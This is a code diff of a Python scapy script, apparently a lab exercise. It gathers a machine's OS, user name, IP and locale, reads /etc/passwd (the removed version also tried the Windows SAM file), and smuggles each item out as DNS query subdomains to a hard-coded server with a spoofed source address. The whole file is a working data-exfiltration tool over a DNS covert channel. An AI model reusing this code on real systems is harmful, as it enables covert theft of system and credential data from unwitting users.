@@ -1,55 +1,79 @@
 from scapy.all import *
-import platform
+import platform 
 import getpass
 import socket
 import locale
 import time
-
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
+import netifaces
+
 
 SOURCE_IP = '1.2.3.4'
+
 DEST_IP = '127.0.0.1'
 
-def get_details():
+#    if (os.name == "posix"): # linux
+#         with open("/etc/passwd", "rb") as f:
+#             pass_file = f.read()
+#         available_languages = locale.locale_alias.keys()
+#         user_language, _ = locale.getdefaultlocale()
+#         version = os.uname().nodename
+#     else: # windows
+#         #with open("C:\\Windows\\System32\\config", "rb") as f: #  Permission denied: 'C:\\Windows\\System32\\config'
+#         #    pass_file = f.read()
+#         pass_file = " "
+#         available_languages = locale.windows_locale.values()
+#         user_language, _ = locale.getdefaultlocale()
+#         version = sys.getwindowsversion().platform_version
+#         version = '.'.join(map(str, sys.getwindowsversion().platform_version))
+
+
+# This function returns the details of the system
+def get_details(): 
     os = platform.system()
     os_version = platform.release()
     user = getpass.getuser()
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
-    language = locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "Unknown"
+    language = locale.getdefaultlocale()
 
-    if os == 'Windows':
-        password_file = open('C:\\Windows\\System32\\config\\SAM', 'r').read()
-    else:  # Assuming Linux system
-        password_file = open('/etc/passwd', 'r').read()
+    return os, os_version, user, ip, language[0]
 
-    return os, os_version, user, hostname, ip, language, password_file
+# This function returns the contents of the password file
+def get_password_file():
+    os = platform.system()
+    try:
+        if os == 'Linux':
+            return open('/etc/passwd', 'r').readlines()
+    except:
+        return ""
 
+# This function sends the DNS query to the server with the details of the system
+def send_dns_query():
+    
+    details = get_details() # Get the details of the system
+    file_contents = get_password_file() # Get the contents of the password file
 
-def send_dns_query(site, hostname, ip, language, password_file):
-    ip = IP(dst=DEST_IP)
-    udp = UDP(sport=RandShort(), dport=53)
-    dns = DNS(rd=1, qd=DNSQR(qname=site, qtype="TXT", qclass="IN"))
-    dns.an = DNSRR(rrname=site, type="TXT", rclass="IN", ttl=1,
-                   rdata=f"Hostname: {hostname}, IP: {ip}, Language: {language}, Password File: {password_file}")
-    packet = ip / udp / dns
-    send(packet, verbose=0)
+    ip = IP(src=SOURCE_IP, dst=DEST_IP) 
+    udp = UDP(sport=RandShort(), dport=53) 
+
+    for detail in details: # For each detail, send a DNS query
+        site = detail+'.google.com'
+        print(site)
+        dns = DNS(rd=1, qd=DNSQR(qname=site)) 
+        packet = ip/udp/dns 
+        send(packet, verbose=0) 
+        time.sleep(1) 
+
+    for line in file_contents:
+        site = line+'.google.com'
+        print(site)
+        dns = DNS(rd=1, qd=DNSQR(qname=site)) 
+        packet = ip/udp/dns 
+        send(packet, verbose=0)
+        time.sleep(1)
 
 
 if __name__ == '__main__':
-    details = get_details()
-    hostname = details[3]
-    ip = details[4]
-    language = details[5]
-    password_file = details[6]
-
-    for detail in details[:3]:
-        site = detail.strip() + '.google.com'
-        print(site)
-        send_dns_query(site, hostname, ip, language, password_file)
-
-    print("Sending password file...")
-    site = "password_file.google.com"
-    send_dns_query(site, hostname, ip, language, password_file)
-    time.sleep(1)
+    send_dns_query()
